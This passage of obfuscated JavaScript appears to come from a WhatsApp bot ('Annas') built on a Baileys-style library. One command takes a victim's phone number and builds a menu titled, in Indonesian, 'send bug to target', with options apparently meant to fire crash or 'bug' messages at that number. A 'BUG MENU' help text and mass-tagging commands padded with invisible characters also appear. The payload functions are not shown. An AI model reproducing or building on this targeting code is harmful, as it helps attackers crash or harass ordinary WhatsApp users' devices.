          let _0x661bd2 = generateWAMessageFromContent(_0x516d4a._0x19b14a, {
            "_0x48cb7a": {
              "message": {
                "messageContextInfo": _0x3edeb2,
                "_0x39f8b4": proto._0x8fefb1._0x1525c2.create({
                  "_0x997701": {
                    "_0xe6f9af": [_0x516d4a.sender],
                    "_0x2d69a1": _0x1f46bc
                  },
                  "body": proto._0x8fefb1._0x1525c2._0xa68fe5.create(_0x2b7039),
                  "_0x524cb9": proto._0x8fefb1._0x1525c2._0x3f7d35.create(_0x49ea54),
                  "_0x516bd0": proto._0x8fefb1._0x1525c2._0x10b529.create({
                    "_0x163f12": true,
                    ...(await prepareWAMessageMedia({
                      "image": await fs._0x4fdcbb("./dah.jpg")
                    }, _0x49aafa))
                  }),
                  "_0x597f49": proto._0x8fefb1._0x1525c2._0x5d2380.create({
                    "buttons": [{
                      "name": "single_select",
                      "_0x14eb59": JSON.stringify(_0x4304fc)
                    }, {
                      "name": "cta_url",
                      "_0x14eb59": "{\"display_text\":\"𝙈𝙮 𝙔𝙤𝙪𝙩𝙪𝙗𝙚\",\"url\":\"https://youtube.com/@AnnasIncus\",\"merchant_url\":\"https://youtube.com/@AnnasIncus\"}"
                    }]
                  })
                })
              }
            }
          }, {
            "_0x5f5834": _0x516d4a.sender,
            "_0x1b9bca": _0x516d4a
          });
          await _0x799da7._0x35132e(_0x661bd2.key._0x500b53, _0x661bd2.message, {
            "_0x560a27": _0x661bd2.key.id
          });
        }
        break;
      case "🤬":
        {
          if (!_0x211fa5) {
            return _0x105e8a(mess.only._0x36cabb);
          }
          if (!q) {
            return _0x105e8a("Example: " + (_0x5999dc + _0x1a4aba) + " 62×××");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          const _0x408388 = {
            title: "𝗝𝗼𝗸𝗲𝗿 𝗦𝗮𝗱",
            id: "🤡 " + target
          };
          const _0x1f7c32 = {
            title: "🤡",
            _0x6cb12: " 〆 𝗔𝗻𝗻𝗮𝘀 〆  ",
            rows: [_0x408388]
          };
          const _0x3de2fa = {
            title: "🥵",
            _0x6cb12: " 〆 𝗔𝗻𝗻𝗮𝘀 〆  ",
            rows: [{
              "title": "𝙠𝙚𝙥𝙖𝙣𝙖𝙨𝙖𝙣",
              "id": "🥵 " + target
            }]
          };
          const _0x36ff60 = {
            title: " 𝘼𝙢𝙥𝙖𝙨 ",
            _0x6cb12: "〆 𝗔𝗻𝗻𝗮𝘀 〆  ",
            rows: [{
              "title": "𝗬𝗧 : 𝗔𝗡𝗡𝗔𝗦𝗜𝗡𝗖𝗨𝗦 🔥",
              "id": "ampas " + target
            }]
          };
          const _0x19fe5b = {
            title: "𝗬𝗧 : 𝗔𝗡𝗡𝗔𝗦𝗜𝗡𝗖𝗨𝗦 🔥",
            id: "dor🔫 " + target
          };
          const _0x46104c = {
            title: " 𝘿𝙤𝙧🔫 ",
            _0x6cb12: "〆 𝗔𝗻𝗻𝗮𝘀 〆  ",
            rows: [_0x19fe5b]
          };
          const _0x271c6e = {
            title: " 𝘼𝙣𝙟𝙞𝙣𝙜",
            _0x6cb12: "〆 𝗔𝗻𝗻𝗮𝘀 〆  ",
            rows: [{
              "title": "𝗬𝗧 : 𝗔𝗡𝗡𝗔𝗦𝗜𝗡𝗖𝗨𝗦 🔥",
              "id": "anjing " + target
            }]
          };
          const _0x4079f7 = {
            title: " 😄 ",
            _0x6cb12: "〆 𝘼𝙉𝙉𝘼𝙎 𝙉𝙄𝙉𝙅𝘼˼ ",
            rows: [{
              "title": "𝗬𝗧 : 𝗔𝗡𝗡𝗔𝗦𝗜𝗡𝗖𝗨𝗦 🔥",
              "id": "😄 " + target
            }]
          };
          const _0x199d95 = {
            title: "𝗬𝗧 : 𝗔𝗡𝗡𝗔𝗦𝗜𝗡𝗖𝗨𝗦 🔥",
            id: "😃 " + target
          };
          const _0xaa17f9 = {
            title: " 😃 ",
            _0x6cb12: "〆 𝘼𝙉𝙉𝘼𝙎 𝙉𝙄𝙉𝙅𝘼˼ ",
            rows: [_0x199d95]
          };
          const _0x445c31 = {
            title: " 😀",
            _0x6cb12: "〆 𝘼𝙉𝙉𝘼𝙎 𝙉𝙄𝙉𝙅𝘼˼ ",
            rows: [{
              "title": "𝗬𝗧 : 𝗔𝗡𝗡𝗔𝗦𝗜𝗡𝗖𝗨𝗦 🔥",
              "id": "😀 " + target
            }]
          };
          const _0x5a6359 = {
            title: " 😅 ",
            _0x6cb12: "〆 𝘼𝙉𝙉𝘼𝙎 𝙉𝙄𝙉𝙅𝘼˼ ",
            rows: [{
              "title": "𝗬𝗧 : 𝗔𝗡𝗡𝗔𝗦𝗜𝗡𝗖𝗨𝗦 🔥",
              "id": "😅 " + target
            }]
          };
          const _0xf2b446 = {
            title: "𝗬𝗧 : 𝗔𝗡𝗡𝗔𝗦𝗜𝗡𝗖𝗨𝗦 🔥",
            id: "😆 " + target
          };
          const _0x3d2768 = {
            title: " 😆 ",
            _0x6cb12: "〆 𝘼𝙉𝙉𝘼𝙎 𝙉𝙄𝙉𝙅𝘼˼ ",
            rows: [_0xf2b446]
          };
          const _0x40c3ed = {
            title: " 😁",
            _0x6cb12: "〆 𝘼𝙉𝙉𝘼𝙎 𝙉𝙄𝙉𝙅𝘼˼ ",
            rows: [{
              "title": "𝗬𝗧 : 𝗔𝗡𝗡𝗔𝗦𝗜𝗡𝗖𝗨𝗦 🔥",
              "id": "😁 " + target
            }]
          };
          const _0x1d73f5 = {
            title: "𝗬𝗧 : 𝗔𝗡𝗡𝗔𝗦𝗜𝗡𝗖𝗨𝗦 🔥",
            id: "🤣 " + target
          };
          const _0x132100 = {
            title: " 🤣 ",
            _0x6cb12: "〆 𝘼𝙉𝙉𝘼𝙎 𝙉𝙄𝙉𝙅𝘼˼ ",
            rows: [_0x1d73f5]
          };
          const _0xb5b3af = {
            title: " 😂",
            _0x6cb12: "〆 𝘼𝙉𝙉𝘼𝙎 𝙉𝙄𝙉𝙅𝘼˼ ",
            rows: [{
              "title": "𝗬𝗧 : 𝗔𝗡𝗡𝗔𝗦𝗜𝗡𝗖𝗨𝗦 🔥",
              "id": "😂 " + target
            }]
          };
          const _0xae9ec1 = {
            title: "🥶",
            _0x6cb12: " 〆 𝗔𝗻𝗻𝗮𝘀 〆  ",
            rows: [{
              "title": "𝙙𝙞𝙣𝙜𝙞𝙣 𝙩𝙖𝙥𝙞 𝙠𝙚𝙟𝙖𝙢",
              "id": "🥶 " + target
            }]
          };
          let _0x15b329 = [_0x1f7c32, _0x3de2fa, _0x36ff60, _0x46104c, _0x271c6e, _0x4079f7, _0xaa17f9, _0x445c31, _0x5a6359, _0x3d2768, _0x40c3ed, _0x132100, _0xb5b3af, _0xae9ec1];
          const _0x5105ed = {
            title: " 〆 𝗔𝗻𝗻𝗮𝘀 〆 ",
            _0x3cb1e3: _0x15b329
          };
          const _0xe542d1 = {
            _0x110705: {},
            _0xe95360: 0x2
          };
          const _0x205b9d = {
            text: "𝙎𝙀𝙉𝘿 𝘽𝙐𝙂 𝙆𝙀 𝙏𝘼𝙍𝙂𝙀𝙏 : " + target + "\n\n𝙋𝙄𝙇𝙄𝙃 𝙈𝙀𝙉𝙐 𝘿𝙄 𝘽𝘼𝙒𝘼𝙃"
          };
          const _0x42be06 = {
            text: ''
          };
          let _0x372bc7 = generateWAMessageFromContent(_0x516d4a._0x19b14a, {
            "_0x48cb7a": {
              "message": {
                "messageContextInfo": _0xe542d1,
                "_0x39f8b4": proto._0x8fefb1._0x1525c2.create({
                  "_0x997701": {
                    "_0xe6f9af": [_0x516d4a.sender],
                    "_0x4baafc": true,
                    "_0x20e012": {
                      "_0x334d20": "0@newsletter",
                      "_0x196138": "Powered By 〆 𝗔𝗻𝗻𝗮𝘀 〆 ˼",
                      "_0x30246d": -1
                    },
                    "_0x4ef4e2": {
                      "_0x290630": _0x799da7._0xb59c48(_0x799da7._0x40fd71.id)
                    }
                  },
                  "body": proto._0x8fefb1._0x1525c2._0xa68fe5.create(_0x205b9d),
                  "_0x524cb9": proto._0x8fefb1._0x1525c2._0x3f7d35.create(_0x42be06),
                  "_0x516bd0": proto._0x8fefb1._0x1525c2._0x10b529.create({
                    "title": '',
                    "_0x378735": "〆 𝗔𝗻𝗻𝗮𝘀 〆 ",
                    "_0x163f12": true,
                    ...(await prepareWAMessageMedia({
                      "image": await fs._0x4fdcbb("./image/mama.jpg")
                    }, {
                      "upload": _0x799da7._0x4d1b66
                    }))
                  }),
                  "_0x597f49": proto._0x8fefb1._0x1525c2._0x5d2380.create({
                    "buttons": [{
                      "name": "single_select",
                      "_0x14eb59": JSON.stringify(_0x5105ed)
                    }, {
                      "name": "cta_url",
                      "_0x14eb59": "{\"display_text\":\"𝙈𝙮 𝙔𝙤𝙪𝙩𝙪𝙗𝙚\",\"url\":\"https://youtube.com/@AnnasIncus\",\"merchant_url\":\"https://youtube.com/@AnnasIncus\"}"
                    }]
                  })
                })
              }
            }
          }, {});
          await _0x799da7._0x35132e(_0x372bc7.key._0x500b53, _0x372bc7.message, {
            "_0x560a27": _0x372bc7.key.id
          });
        }
        break;
      case "perintah":
        {
          await _0x1fdfac();
          const _0x52734c = "\n┏─ ｢ `〆 𝗔𝗻𝗻𝗮𝘀 〆  ` ｣ ─❐\n│〆 𝐍𝐚𝐦𝐞 :" + _0x1d0560 + "\n║▬▭「 𝙎𝙐𝙈𝘽𝙀𝙍 」▭▬\n│〆 𝙊𝙬𝙣𝙚𝙧 : " + author + "\n║〆 𝙉𝙖𝙢𝙖 𝘽𝙤𝙩 : " + namabot + "\n│〆 𝘾𝙧𝙚𝙖𝙩𝙤𝙧 : " + namaCreator + "\n║〆 𝙊𝙬𝙣 𝙉𝙤 : 6285768351775\n╰▬▭「 〆 𝗔𝗻𝗻𝗮𝘀 〆  」▭▬\n╔─═⊱ *「 `BUG MENU` 」* ─═⬣\n│┏⊱\n║〆 \n║▄▀█ █▄░█ █▄░█ ▄▀█ █▀\n║█▀█ █░▀█ █░▀█ █▀█ ▄█\n║〆 \n║┗⊱𝙎𝘾 𝙄𝙉𝙄 𝘿𝘼𝙇𝘼𝙈 𝙋𝙀𝙍𝙆𝙀𝙈𝘽𝘼𝙉𝙂𝘼𝙉 𝙈𝙊𝙃𝙊𝙉 𝘽𝘼𝙉𝙏𝙐𝘼𝙉𝙉𝙔𝘼 𝙐𝙉𝙏𝙐𝙆 𝙎\n║𝙋𝙊𝙍𝙏 𝙎𝘼𝙔𝘼 𝘿𝙀𝙉𝙂𝘼𝙉 𝙎𝘼𝙇𝙄𝙉 𝙎𝙐𝙋𝙋𝙊𝙍𝙏\n┗━━━━━━━━━━━━━━━━━⬣\n\n┏━━⬣  Thanks To  友\n┃ 🔥 𝘼𝙣𝙣𝙖𝙨𝙄𝙣𝙘𝙪𝙨\n┃ 🔥 𝙊𝙧𝙖𝙣𝙜 𝙩𝙪𝙖\n┃ 🔥 𝙥𝙖𝙧𝙖𝙝 𝙥𝙚𝙣𝙙𝙪𝙠𝙪𝙣𝙜 \n┗━━⬣ 〆 𝗔𝗻𝗻𝗮𝘀 〆 ˼  ";
          const _0x166a2a = {
            title: "𝙱𝚄𝚃𝚃𝙾𝙽 𝙻𝙸𝚂𝚃",
            _0x6cb12: "𝙍𝙐𝙇𝙀𝙎",
            rows: [{
              "title": " 𝙍𝙐𝙇𝙀𝙎 ",
              "id": ".perintah"
            }]
          };
          const _0x3ed4e5 = {
            _0x6cb12: "Bug Menu",
            rows: [{
              "title": " List Bug",
              "id": ".bugmenu"
            }]
          };
          const _0x25e9e3 = {
            _0x6cb12: "𝐁𝐮𝐠 𝐌𝐞𝐧𝐮",
            rows: [{
              "title": " 𝘼𝙩𝙩𝙖𝙘𝙠  ",
              "id": ".bugmenu"
            }]
          };
          const _0xfa4cce = {
            title: " 𝙇𝙄𝙎𝙏 𝙋𝘼𝙉𝙀𝙇 ",
            id: ".menupanel"
          };
          const _0x3fdd76 = {
            _0x6cb12: "𝘽𝙐𝘼𝙏 𝙋𝘼𝙉𝙀𝙇",
            rows: [_0xfa4cce]
          };
          let _0x4992db = [_0x166a2a, _0x3ed4e5, _0x25e9e3, _0x3fdd76];
          const _0x225d29 = {
            title: "〆 𝗔𝗻𝗻𝗮𝘀 〆 ",
            _0x3cb1e3: _0x4992db
          };
          const _0x540a73 = {
            _0x110705: {},
            _0xe95360: 0x2
          };
          const _0x3b57b2 = {
            _0x2cdeaa: true
          };
          const _0x27b90e = {
            text: _0x52734c
          };
          const _0x216b69 = {
            text: ''
          };
          const _0xed0cc1 = {
            upload: _0x799da7._0x4d1b66
          };
          let _0x15839f = generateWAMessageFromContent(_0x516d4a._0x19b14a, {
            "_0x48cb7a": {
              "message": {
                "messageContextInfo": _0x540a73,
                "_0x39f8b4": proto._0x8fefb1._0x1525c2.create({
                  "_0x997701": {
                    "_0xe6f9af": [_0x516d4a.sender],
                    "_0x2d69a1": _0x3b57b2
                  },
                  "body": proto._0x8fefb1._0x1525c2._0xa68fe5.create(_0x27b90e),
                  "_0x524cb9": proto._0x8fefb1._0x1525c2._0x3f7d35.create(_0x216b69),
                  "_0x516bd0": proto._0x8fefb1._0x1525c2._0x10b529.create({
                    "_0x163f12": true,
                    ...(await prepareWAMessageMedia({
                      "image": await fs._0x4fdcbb("./dah.jpg")
                    }, _0xed0cc1))
                  }),
                  "_0x597f49": proto._0x8fefb1._0x1525c2._0x5d2380.create({
                    "buttons": [{
                      "name": "single_select",
                      "_0x14eb59": JSON.stringify(_0x225d29)
                    }, {
                      "name": "cta_url",
                      "_0x14eb59": "{\"display_text\":\"𝙈𝙮 𝙔𝙤𝙪𝙩𝙪𝙗𝙚\",\"url\":\"https://youtube.com/@AnnasIncus\",\"merchant_url\":\"https://youtube.com/@AnnasIncus\"}"
                    }]
                  })
                })
              }
            }
          }, {
            "_0x5f5834": _0x516d4a.sender,
            "_0x1b9bca": _0x516d4a
          });
          await _0x799da7._0x35132e(_0x15839f.key._0x500b53, _0x15839f.message, {
            "_0x560a27": _0x15839f.key.id
          });
        }
        break;
      case "z":
      case "hidetag":
        if (!_0x1ba836) {
          return _0x105e8a(mess.only.owner);
        }
        if (!_0x288ff4) {
          return _0x105e8a("Teks?");
        }
        _0x799da7._0x2e9b2a(_0x516d4a._0x19b14a, {
          "text": _0x288ff4 ? _0x288ff4 : '',
          "_0x5315da": _0x5800b1.map(_0x45df55 => _0x45df55.id)
        }, {
          "_0x1b9bca": _0x516d4a
        });
        break;
      case "tagall":
        {
          if (!_0x1ba836 && !_0x8ccd36) {
            return _0x105e8a(mess._0x49ae3d);
          }
          if (!_0x307159) {
            return joreply(mess.only.group);
          }
          if (!q) {
            return _0x105e8a("Teks Nya Mana Kak?");
          }
          let _0x1bfb62 = (q ? q : '') + "\n‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎